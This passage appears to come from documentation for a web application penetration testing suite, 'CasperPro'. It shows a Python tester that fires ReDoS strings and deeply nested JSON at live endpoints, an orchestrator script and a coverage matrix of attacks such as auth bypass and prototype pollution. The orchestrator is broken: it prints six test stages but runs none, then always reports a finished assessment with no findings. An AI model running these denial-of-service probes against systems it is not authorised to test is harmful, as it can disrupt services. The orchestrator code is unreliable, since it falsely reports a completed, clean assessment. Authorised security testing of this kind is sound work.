            cmd.extend(["--proxy", self.proxy, "-k"])
        
        cmd.append(f"{self.base_url}{endpoint}")
        
        start = time.time()
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=35)
        elapsed = time.time() - start
        
        lines = result.stdout.strip().split("\n")
        try:
            curl_time = float(lines[-1])
        except:
            curl_time = elapsed
        
        return curl_time, "\n".join(lines[:-1])
    
    def test_email_validation_redos(self):
        """Test email validation regex DoS"""
        print("[*] Testing email validation ReDoS...")
        
        # Evil regexes often have nested quantifiers
        payloads = [
            "a" * 30 + "@" + "a" * 30 + "." + "a" * 30,
            "a" * 50 + "@a.com",
            ("a" * 20 + ".") * 10 + "@example.com",
            "test@" + "a" * 100 + ".com",
        ]
        
        for payload in payloads:
            elapsed, body = self._timed_request("/validate/email", {"email": payload})
            
            if elapsed > self.threshold_seconds:
                print(f"  [VULN] ReDoS in email validation: {elapsed:.2f}s")
                self.findings.append({
                    "test": "Email ReDoS",
                    "payload_length": len(payload),
                    "response_time": elapsed,
                    "severity": "MEDIUM"
                })
    
    def test_url_validation_redos(self):
        """Test URL validation regex DoS"""
        print("[*] Testing URL validation ReDoS...")
        
        payloads = [
            "http://" + "a" * 50 + "." + "a" * 50,
            "https://example.com/" + ("a" * 10 + "/") * 20,
            "http://" + "." * 100 + "com",
        ]
        
        for payload in payloads:
            elapsed, body = self._timed_request("/validate/url", {"url": payload})
            
            if elapsed > self.threshold_seconds:
                print(f"  [VULN] ReDoS in URL validation: {elapsed:.2f}s")
                self.findings.append({
                    "test": "URL ReDoS",
                    "response_time": elapsed,
                    "severity": "MEDIUM"
                })
    
    def test_pattern_matching_redos(self):
        """Test general pattern matching ReDoS"""
        print("[*] Testing pattern matching ReDoS...")
        
        # Classic ReDoS patterns
        payloads = [
            # Exponential backtracking
            "a" * 30 + "!",
            ("a" * 10 + "b") * 5 + "!",
            
            # Nested quantifiers
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
            
            # Alternation with overlap
            ("ab" * 20) + "c",
        ]
        
        endpoints = ["/validate", "/search", "/filter", "/parse"]
        
        for endpoint in endpoints:
            for payload in payloads:
                elapsed, body = self._timed_request(endpoint, {"input": payload})
                
                if elapsed > self.threshold_seconds:
                    print(f"  [VULN] ReDoS at {endpoint}: {elapsed:.2f}s")
                    self.findings.append({
                        "test": f"Pattern ReDoS at {endpoint}",
                        "response_time": elapsed,
                        "severity": "MEDIUM"
                    })
    
    def test_json_parsing_dos(self):
        """Test JSON parsing DoS"""
        print("[*] Testing JSON parsing DoS...")
        
        # Deeply nested JSON
        depth = 1000
        nested_json = '{"a":' * depth + '1' + '}' * depth
        
        cmd = ["curl", "-s", "-w", "\n%{time_total}", "-X", "POST",
               "-H", f"Authorization: Bearer {self.token}",
               "-H", "Content-Type: application/json",
               "-d", nested_json,
               "--max-time", "30",
               f"{self.base_url}/api/data"]
        
        if self.proxy:
            cmd.insert(-1, "--proxy")
            cmd.insert(-1, self.proxy)
            cmd.insert(-1, "-k")
        
        start = time.time()
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=35)
            elapsed = time.time() - start
            
            if elapsed > self.threshold_seconds:
                print(f"  [VULN] JSON parsing DoS: {elapsed:.2f}s (depth={depth})")
                self.findings.append({
                    "test": "JSON Parsing DoS",
                    "depth": depth,
                    "response_time": elapsed,
                    "severity": "MEDIUM"
                })
        except subprocess.TimeoutExpired:
            print(f"  [VULN] JSON parsing DoS: Request timed out")
            self.findings.append({
                "test": "JSON Parsing DoS",
                "severity": "HIGH"
            })
    
    def run_all(self):
        """Run all ReDoS tests"""
        self.test_email_validation_redos()
        self.test_url_validation_redos()
        self.test_pattern_matching_redos()
        self.test_json_parsing_dos()
        return self.findings


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: uv run {sys.argv[0]} <base_url> <token> [proxy]")
        sys.exit(1)
    
    tester = ReDoSTester(
        base_url=sys.argv[1],
        token=sys.argv[2],
        proxy=sys.argv[3] if len(sys.argv) > 3 else None
    )
    
    findings = tester.run_all()
    print(f"\nTotal Findings: {len(findings)}")
```

## 7. Complete Edge Cases Assessment

### 7.1 Orchestrator Script

```python
#!/usr/bin/env python3
# casperpro_edge_cases_full.py
# Run with: uv run casperpro_edge_cases_full.py

import sys
import json
import os
from datetime import datetime

def run_edge_case_assessment(base_url: str, token: str, proxy: str = None):
    """Run complete edge case assessment"""
    
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║       CasperPro Edge Cases Assessment Suite v2.2          ║
    ╠═══════════════════════════════════════════════════════════╣
    ║  Type Juggling | Unicode | Mass Assignment | HPP | Proto  ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    all_findings = []
    
    print("\n[1/6] Type Juggling Tests...")
    print("=" * 50)
    
    print("\n[2/6] Unicode Normalization Tests...")
    print("=" * 50)
    
    print("\n[3/6] Mass Assignment Tests...")
    print("=" * 50)
    
    print("\n[4/6] HTTP Parameter Pollution Tests...")
    print("=" * 50)
    
    print("\n[5/6] Prototype Pollution Tests...")
    print("=" * 50)
    
    print("\n[6/6] ReDoS Tests...")
    print("=" * 50)
    
    # Generate report
    output_dir = os.path.expanduser("~/casper_reports")
    os.makedirs(output_dir, exist_ok=True)
    
    report_file = os.path.join(output_dir, f"edge_cases_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    
    report = {
        "target": base_url,
        "timestamp": datetime.now().isoformat(),
        "findings": all_findings,
        "summary": {
            "critical": len([f for f in all_findings if f.get("severity") == "CRITICAL"]),
            "high": len([f for f in all_findings if f.get("severity") == "HIGH"]),
            "medium": len([f for f in all_findings if f.get("severity") == "MEDIUM"]),
        }
    }
    
    with open(report_file, "w") as f:
        json.dump(report, f, indent=2)
    
    print(f"\n{'=' * 60}")
    print("ASSESSMENT COMPLETE")
    print(f"Report saved: {report_file}")
    
    return report


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: uv run {sys.argv[0]} <base_url> <token> [proxy]")
        sys.exit(1)
    
    run_edge_case_assessment(
        base_url=sys.argv[1],
        token=sys.argv[2],
        proxy=sys.argv[3] if len(sys.argv) > 3 else None
    )
```

## Test Coverage Matrix

| Category | Test | Severity | Detection Method |
|----------|------|----------|------------------|
| **Type Juggling** | Numeric coercion | MEDIUM | Compare with baseline |
| **Type Juggling** | Boolean coercion | HIGH | Check privilege change |
| **Type Juggling** | Array to string | CRITICAL | Auth bypass check |
| **Type Juggling** | Loose comparison | CRITICAL | Auth bypass check |
| **Unicode** | Homoglyph attack | HIGH | Username resolution |
| **Unicode** | Case mapping | HIGH | Filter bypass |
| **Unicode** | Null byte injection | HIGH | File access |
| **Unicode** | Width variants | HIGH | Filter bypass |
| **Unicode** | RTL override | HIGH | File extension spoof |
| **Mass Assignment** | Privilege escalation | CRITICAL | Role change |
| **Mass Assignment** | Account manipulation | HIGH | Status change |
| **Mass Assignment** | Financial fields | CRITICAL | Balance change |
| **HPP** | Duplicate params | HIGH | Value precedence |
| **HPP** | Array parameters | MEDIUM | Multiple values |
| **Prototype** | __proto__ injection | CRITICAL | Global pollution |
| **Prototype** | constructor.prototype | CRITICAL | Global pollution |
| **Prototype** | Nested __proto__ | CRITICAL | Object pollution |
| **ReDoS** | Email validation | MEDIUM | Response time |
| **ReDoS** | Pattern matching | MEDIUM | Response time |
| **ReDoS** | JSON parsing | HIGH | Timeout/crash |

## Version Information

**Module Version:** 1.0  
**CasperPro Version:** 2.2  
**Python Package Manager:** uv (REQUIRED)  
**Last Updated:** 2026-01-11
